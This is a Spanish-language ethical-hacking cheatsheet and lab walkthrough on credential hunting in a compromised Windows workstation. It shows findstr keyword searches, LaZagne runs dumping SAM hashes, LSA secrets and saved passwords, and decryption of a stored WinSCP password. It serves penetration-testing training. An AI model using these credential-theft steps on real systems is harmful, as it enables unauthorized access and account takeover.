
# Credential Hunting - Windows

Una vez que tengamos acceso a una máquina Windows de destino a través de la GUI o CLI, podemos beneficiarnos significativamente al incorporar la búsqueda de credenciales en nuestro enfoque. La búsqueda de credenciales o `Credential Hunting` es el proceso de realizar búsquedas detalladas en todo el sistema de archivos y en varias aplicaciones para descubrir credenciales. Para entender este concepto situémonos en un escenario. Hemos obtenido acceso a la estación de trabajo Windows 10 de un Administrador de IT a través de RDP.

***

## <mark style="color:purple;">Centrados en la búsqueda</mark>

Muchas de las herramientas que tenemos a nuestra disposición en Windows tienen función de búsqueda. Hoy en día, existen funciones centradas en la búsqueda integradas en la mayoría de las aplicaciones y sistemas operativos, por lo que podemos utilizarlas a nuestro favor en una interacción.&#x20;

Es posible que un usuario haya documentado sus contraseñas en algún lugar del sistema. Incluso puede haber credenciales predeterminadas que se pueden encontrar en varios archivos. Sería prudente basar nuestra búsqueda de credenciales en lo que sabemos sobre cómo se utiliza el sistema de destino. En este caso, sabemos que tenemos acceso a la estación de trabajo de un administrador de TI.

`¿Qué podría estar haciendo un administrador de TI en el día a día y cuáles de esas tareas pueden requerir credenciales?`

Podemos utilizar esta pregunta y consideración para refinar nuestra búsqueda y reducir la necesidad de conjeturas aleatorias tanto como sea posible.

### **Términos clave para buscar**

Ya sea que terminemos con acceso a la GUI o CLI, sabemos que tendremos algunas herramientas para usar en la búsqueda, pero de igual importancia es qué estamos buscando exactamente. A continuación se muestran algunos términos clave útiles que podemos utilizar y que pueden ayudarnos a descubrir algunas credenciales:

|               |              |             |
| ------------- | ------------ | ----------- |
| Passwords     | Passphrases  | Keys        |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |

Usemos algunos de estos términos clave para buscar en la estación de trabajo del Administrador de IT.

***

## <mark style="color:purple;">Herramientas de búsqueda</mark>

Con acceso a la GUI, vale la pena intentar usar `Windows Search` para buscar archivos en el destino usando algunas de las palabras clave mencionadas anteriormente.

![Búsqueda de Windows](https://academy.hackthebox.com/storage/modules/147/WindowsSearch.png)

De forma predeterminada, buscará en varias configuraciones del sistema operativo y en el sistema de archivos archivos y aplicaciones que contengan el término clave ingresado en la barra de búsqueda.

También podemos aprovechar herramientas de terceros como [Lazagne](https://github.com/AlessandroZ/LaZagne) para descubrir rápidamente credenciales que los navegadores web u otras aplicaciones instaladas pueden almacenar de forma insegura. Sería beneficioso mantener una [copia independiente](https://github.com/AlessandroZ/LaZagne/releases/) de Lazagne en nuestro host de atacante para que podamos transferirla rápidamente al objetivo. `Lazagne.exe` nos irá bien en este escenario. Podemos usar nuestro cliente RDP para copiar el archivo al objetivo desde nuestro host de ataque. Si estamos utilizando `xfreerdp` lo único que debemos hacer es copiar y pegar en la sesión RDP que hayamos establecido.

Una vez que `Lazagne.exe` esté en el objetivo, podemos abrir el símbolo del sistema o PowerShell, navegar hasta el directorio en el que se cargó el archivo y ejecutar el siguiente comando:

### **Ejecutando Lazagne**

```powershell
C:\Users\bob\Desktop> start lazagne.exe all
```

Esto ejecutará Lazagne y ejecutará todos los módulos incluidos indicándole `all`. Podemos incluir la opción `-vv` para analizar qué está haciendo en segundo plano. Una vez que presionemos Intro, se abrirá otro mensaje y mostrará los resultados.

### **Salida Lazagne**

```bash
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22
```

Si usáramos la opción `-vv`, veríamos intentos de recopilar contraseñas de todo el software compatible con Lazagne. También podemos buscar en la página de GitHub en la sección de software compatible para ver todo el software del que Lazagne intentará recopilar credenciales. Puede resultar un poco impactante ver lo fácil que puede ser obtener credenciales en texto claro. Gran parte de esto puede atribuirse a la forma insegura en que muchas aplicaciones almacenan las credenciales.

### **Findstr**

También podemos usar [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) para buscar patrones en muchos tipos de archivos. Teniendo en cuenta los términos clave comunes, podemos usar variaciones de este comando para descubrir credenciales en un destino de Windows:

```powershell
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

***

## <mark style="color:purple;">Consideraciones adicionales</mark>

Hay miles de herramientas y términos clave que podemos utilizar para buscar credenciales en los sistemas operativos Windows. Sepa que cuáles elegimos usar se basarán principalmente en la función de la computadora. Si utilizamos un sistema operativo Windows Server, podemos utilizar un enfoque diferente que si utilizamos un sistema operativo Windows de escritorio. Esté siempre atento a cómo se utiliza el sistema, y ​​esto nos ayudará a saber dónde buscar. A veces, incluso podemos encontrar credenciales navegando y enumerando directorios en el sistema de archivos mientras se ejecutan nuestras herramientas.

Aquí hay algunos otros lugares que debemos tener en cuenta al buscar credenciales:

* Contraseñas en la política de grupo en el recurso compartido SYSVOL
* Contraseñas en scripts en el recurso compartido SYSVOL
* Contraseña en scripts en recursos compartidos de TI
* Contraseñas en archivos web.config en máquinas de desarrollo y recursos compartidos de TI
* desatendida.xml
* Contraseñas en los campos de descripción de usuario o computadora de AD
* Bases de datos KeePass -> extraiga hash, crackee y obtenga mucho acceso.
* Encontrado en sistemas de usuarios y recursos compartidos.
* Archivos como pass.txt, contraseñas.docx, contraseñas.xlsx se encuentran en sistemas de usuario, recursos compartidos, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)

***

## <mark style="color:purple;">Relacionado</mark>

Podemos ver más técnicas de Credential Hunting en Windows en las siguientes secciones:

{% content-ref url="/pages/zLQbfaLDJNg4AWX5ONi6" %}
[Búsqueda de credenciales en Windows](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/robo-de-credenciales-en-windows/busqueda-de-credenciales-en-windows.md)
{% endcontent-ref %}

{% content-ref url="/pages/9xzf7d8zAPvwAV18ZDzr" %}
[Otros robos de credenciales en Windows](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/robo-de-credenciales-en-windows/otros-robos-de-credenciales-en-windows.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Caso práctico</mark>

Ha obtenido acceso a la estación de trabajo Windows 10 de un administrador de TI y comienza su proceso de búsqueda de credenciales buscando credenciales en ubicaciones de almacenamiento comunes.

### Conexión al host por RDP

```shell-session
freerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!
```

<figure><img src="/files/7i0tAtVdwXQx9IWYzfid" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Pregunta 1</mark>

#### ¿Qué contraseña usa Bob para conectarse a los Switches a través de SSH?

Vamos a hacer una búsqueda manual buscando passwords en el buscador de windows:

<figure><img src="/files/4HIzeDfly7L75VRDQV5E" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/UIUg50Nc70tXY2nTU895" alt=""><figcaption></figcaption></figure>

Encvontramos las credenciales para conectarse a los Switches a través de SSH.

### <mark style="color:purple;">Pregunta 2</mark>

#### ¿Cuál es el código de acceso a GitLab que usa Bob?

En el escritorio encontramos una carpeta WorkStuff que contiene las credenciales de GitLab:

<figure><img src="/files/h2oTNTe2MWVvhC0ENxi7" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;">Pregunta 3</mark>

#### ¿Qué credenciales usa Bob con WinSCP para conectarse al servidor de archivos?

Al abrir WinSCP nos muestra el password oculto y no tenemos la posibilidad de verlo.

<figure><img src="/files/56My956J51enWpDzJ9Do" alt=""><figcaption></figcaption></figure>

Al intentar copiar este password tampoco nos deja:

<figure><img src="/files/OlRBb1EFASLbzN3TrEL1" alt=""><figcaption></figcaption></figure>

Transferimos una copia de `lazagne.exe` a la máquina Windows y la ejecutamos para encontrar credenciales guardadas por aplicaciones en el sistema.

```powershell
PS C:\Users\bob\Desktop> .\LaZagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659
[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
[+] System masterkey decrypted for a80228b7-0ca8-4c72-9496-0fc5af387486
[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Pypykatz passwords -----------------

[+] Shahash found !!!
Shahash: b2978f9abc2f356e45cb66ec39510b1ccca08a0e
Nthash: 3c0e5d303ec84884ad5c3b7876a06ea6
Login: bob

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 C0 3A 4A 9B 2C 04 5E 54 55 43 F3 DC    .....:J.,.^TUC..
0010   B9 C1 81 BB 17 D6 BD CE 50 B9 FA 0F D7 94 52 15    ........P.....R.
0020   01 11 35 73 08 74 8F 7C A1 01 94 4A                ..5s.t.|...J

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   E4 FE 18 4B 25 46 81 18 BF 23 F5 A3 2A E8 36 97    ...K%F...#..*.6.
0020   6B A4 92 B3 A4 32 DE B3 91 17 46 B8 EC 63 C4 51    k....2....F..c.Q
0030   A7 0C 18 26 E9 14 5A A2 F3 42 1B 98 ED 0C BD 9A    ...&..Z..B......
0040   0C 1A 1B EF AC B3 76 C5 90 FA 7B 56 CA 1B 48 8B    ......v...{V..H.
0050   32 B3 2C 95 2E 46 50 5A 46 F7 6E 53 66 FB DA 53    2.,..FPZF.nSf..S

########## User: bob ##########

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://gitlab.example.com
Login: root
Password: Gitadmin123

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: ????????????????
Port: 22

[+] Password found !!!
URL: 10.129.202.64
Login: bwilliamson
Password: P@55w0rd!
Port: 22

[+] b2978f9abc2f356e45cb66ec39510b1ccca08a0e ok for masterkey 8871ea87-3279-44d4-85db-0483b7e13f10
[+] b2978f9abc2f356e45cb66ec39510b1ccca08a0e ok for masterkey eccf300e-2d3a-478b-aff9-045d4c3afb15
[+] b2978f9abc2f356e45cb66ec39510b1ccca08a0e ok for masterkey 8871ea87-3279-44d4-85db-0483b7e13f10
[+] b2978f9abc2f356e45cb66ec39510b1ccca08a0e ok for masterkey eccf300e-2d3a-478b-aff9-045d4c3afb15
```

Nos lo muestra oculto, asi que vamos a intentar otro método. Abrimos regedit y vamos a la siguiente ruta, donde vamos a encontrar la contraseña encriptada:

<figure><img src="/files/GM0vxfLDgIkEOme5o02F" alt=""><figcaption></figcaption></figure>

Vamos a utilizar [winscpwasswd](https://github.com/anoopengineer/winscppasswd) para crackearlo de la siguiente manera:

```bash
winscppasswd.exe <host> <username> <encrypted_password>
```

```powershell
PS C:\Users\bob\Desktop> .\winscppasswd.exe 10.129.202.64 ubuntu A35C41489D820A323DAF205EC507BECD6423C45B4FE815B1293E293228296D6C726D6E65726E6C6E726A681A0F3D383135326D6E6F
FSadmin123
```

Y bum, ya tenemos la contraseña en plano: `FSadmin123`

### <mark style="color:purple;">Pregunta 4</mark>

#### ¿Cuál es la contraseña predeterminada de cada cuenta de usuario del dominio Inlanefreight recién creada?

Al ejecutar LaZagne nos hace un volcado de los hashes del sistema, y observamos que uno de ellos es Default Account, por lo que su contraseña debería ser la creada por defecto.

```powershell
PS C:\Users\bob\Desktop> .\LaZagne.exe all

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
```

Navegando por el sistema encontramos el siguiente script, con la contraseña en plano de las nuevas cuentas creadas por defecto en AD:

<figure><img src="/files/zoBwmC09dtK1TfUaINNn" alt=""><figcaption></figcaption></figure>
